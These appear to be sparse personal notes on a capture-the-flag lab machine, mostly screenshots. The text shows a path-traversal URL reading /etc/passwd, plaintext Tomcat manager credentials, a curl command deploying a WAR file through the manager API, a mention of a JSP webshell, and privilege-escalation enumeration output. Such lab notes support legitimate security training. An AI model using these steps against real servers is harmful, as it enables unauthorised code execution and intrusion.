# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: #tomcat #lxc #lxd #adm

# Findings

## External
### Enumeration
![](https://i.imgur.com/bcYbA7V.png)
- LFI
	- ![](https://i.imgur.com/YQK9kZB.png)
- Username: `ash`
- `http://megahosting.htb/news.php?file=../../../../etc/passwd`
![](https://i.imgur.com/gniI6oG.png)
![](https://i.imgur.com/ZJUKfvw.png)

` tomcat: $3cureP4s5w0rd123! `
### Gaining Access
![](https://i.imgur.com/TQMNqVT.png)
![](https://i.imgur.com/77WfG7M.png)
- ` curl -u tomcat:'$3cureP4s5w0rd123!' -T backup.war 'http://tabby.htb:8080/manager/text/deploy?path=/&update=true' `
- I tried to upload `WAR` file with metasploit generating, but it was not working so i used Webshell `JSP`
	- ![](https://i.imgur.com/rdrlAyq.png)
	- ![](https://i.imgur.com/Uv9I6yx.png)

## Internal
### Enumeration
`$enum$`

### Gaining Access
![](https://i.imgur.com/wIFyCVb.png)
![](https://i.imgur.com/GRbkHTg.png)

![](https://i.imgur.com/Dcn5twY.png)
![](https://i.imgur.com/z6Rnmi0.png)
` ash : admin@it `
### Maintaining Access
![](https://i.imgur.com/IMUQrBl.png)
![](https://i.imgur.com/8bN5oBF.png)
![](https://i.imgur.com/k2t3VHX.png)


# Random Notes
<!--⚠️Imgur upload failed, check dev console-->
![[Pasted image 20240509123127.png]]![](https://i.imgur.com/u4xfWhN.png)
```
-rw-r----- 1 root tomcat 5435 Feb 24  2020 /etc/tomcat9/policy.d/04webapps.policy
-rw-r----- 1 root tomcat 2192 Feb 24  2020 /etc/tomcat9/policy.d/01system.policy
-rw-r----- 1 root tomcat 2040 Feb 24  2020 /etc/tomcat9/policy.d/50local.policy
-rw-r----- 1 root tomcat 3237 Feb 24  2020 /etc/tomcat9/policy.d/03catalina.policy
-rw-r----- 1 root tomcat 330 Feb 24  2020 /etc/tomcat9/policy.d/02debian.policy
-rw-r----- 1 root tomcat 7630 May 21  2020 /etc/tomcat9/server.xml
-rw-r----- 1 root tomcat 7262 Feb  5  2020 /etc/tomcat9/catalina.properties
-rw-r----- 1 root tomcat 2799 Feb 24  2020 /etc/tomcat9/logging.properties
-rw-r----- 1 root tomcat 2325 Jun 16  2020 /etc/tomcat9/tomcat-users.xml
-rw-r----- 1 root tomcat 1400 Feb  5  2020 /etc/tomcat9/context.xml
-rw-r----- 1 root tomcat 1149 Feb  5  2020 /etc/tomcat9/jaspic-providers.xml
-rw-r----- 1 root tomcat 172362 Feb  5  2020 /etc/tomcat9/web.xml

╔══════════╣ Unexpected in /opt (usually empty)
total 12
drwxr-xr-x  3 root   root   4096 Aug 19  2021 .
drwxr-xr-x 20 root   root   4096 Sep  7  2021 ..
drwxr-xr-x  3 tomcat tomcat 4096 Aug 19  2021 tomcat

╔══════════╣ Writable log files (logrotten) (limit 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#logrotate-exploitation
logrotate 3.14.0

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes
Writable: /var/log/tomcat9/localhost.2024-05-09.log
Writable: /var/log/tomcat9/localhost.2024-05-08.log.gz
Writable: /var/log/tomcat9/catalina.2024-05-08.log.gz
```
/var/cache/tomcat9/Catalina
/var/lib/tomcat9/webapps
/etc/tomcat9/Catalina